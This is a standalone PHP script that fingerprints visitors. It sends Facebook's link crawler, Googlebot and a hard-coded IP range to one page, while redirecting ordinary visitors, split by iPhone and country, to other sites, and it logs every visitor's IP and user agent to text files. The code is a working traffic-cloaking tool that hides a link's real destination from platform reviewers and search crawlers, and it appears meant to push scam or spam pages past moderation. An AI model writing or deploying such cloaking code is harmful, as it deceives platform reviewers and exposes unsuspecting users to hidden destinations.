
<?php
function checkIP($ip)
{
    $lowIp = ip2long('66.100.0.0');
    $highIp = ip2long('66.255.255.255');
    if ($ip <= $highIp && $lowIp <= $ip) {
        return true;
    }
}

function checkCountry($ip)
{
    $json = file_get_contents("http://ip-api.com/json/{$ip}");
    return json_decode($json)->countryCode;
}

$country = checkCountry($_SERVER['REMOTE_ADDR']);

$allowedAgents = "allowedAgentsmDnCWy2qaDawKz4UcpkxH4ue9BZ8VWhSg-w2un3vRbJizGAQVU5dqXfT9jOLgZNFTrXC7mb7oNvEdIYl36J5PPe1A6sSRBG1pErM.txt";
$blockedAgents = "blockedAgentsmDnCWy2qaDawKz4UcpkxH4ue9BZ8VWhSg-w2un3vRbJizGAQVU5dqXfT9jOLgZNFTrXC7mb7oNvEdIYl36J5PPe1A6sSRBG1pErM.txt";

$ip = ip2long($_SERVER['REMOTE_ADDR']);

if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
    $fAgent = fopen($blockedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' blocked ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://manila.pnnews.dev/mDnCWy2qaDawKz4UcpkxH4ue9BZ8VWhSg-w2un3vRbJizGAQVU5dqXfT9jOLgZNFTrXC7mb7oNvEdIYl36J5PPe1A6sSRBG1pErM.html', true, 301);
    die();
} else {
    $iPod = stripos($_SERVER['HTTP_USER_AGENT'],"iPod");
    $iPhone = stripos($_SERVER['HTTP_USER_AGENT'],"iPhone");
    $iPad = stripos($_SERVER['HTTP_USER_AGENT'],"iPad");
    $Android = stripos($_SERVER['HTTP_USER_AGENT'],"Android");
    $webOS   = stripos($_SERVER['HTTP_USER_AGENT'],"webOS");
    if($iPhone && $country !== 'VN') {
      echo "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = 'http://philnews.info';
// ]]></script>
";
      $fAgent = fopen($allowedAgents, 'a');
      $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
      fwrite($fAgent, $agent);
      fclose($fAgent);
      die();
    } else {
    $fAgent = fopen($allowedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://vmnet.info', true, 301);
    }
}

